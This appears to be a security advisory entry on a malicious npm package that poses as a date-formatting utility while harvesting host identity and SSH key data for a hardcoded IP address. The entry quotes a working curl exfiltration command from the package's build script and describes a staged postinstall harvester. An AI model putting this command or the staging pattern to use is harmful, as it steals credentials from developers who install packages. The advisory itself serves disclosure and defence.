summary: Credential stealer disguised as date-formatting utility, exfiltrates host identity and SSH keys to hardcoded IP
details: Package advertises itself as 'A simple date formatting utility' with a trivial 6-line index.js exposing only `formatDate`, but ships two credential-theft mechanisms targeting the same attacker IP 124.221.154.135. package.json line 7 declares a `build` script `curl -X POST --data "h=$(hostname)&u=$(whoami)" http://124.221.154.135/pre` that POSTs the installer's hostname and username over plain HTTP to the bare IP. postinstall.js enumerates `~/.ssh` (reads the directory, filters `.pub` key files), gathers username/platform, and HTTPS POSTs the JSON payload to the same IP at `https://124.221.154.135/post`. postinstall.js is not wired into package.json `scripts` in this version so it does not auto-run on `npm install`, but its presence alongside the matching C2 IP in the build script demonstrates a staged harvester — a single rename to `postinstall` in `scripts` activates SSH key exfiltration. The mismatch between advertised purpose (date formatting) and shipped capability (host recon + SSH key enumeration to a bare-IP C2) is a textbook cover-story supply-chain attack.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
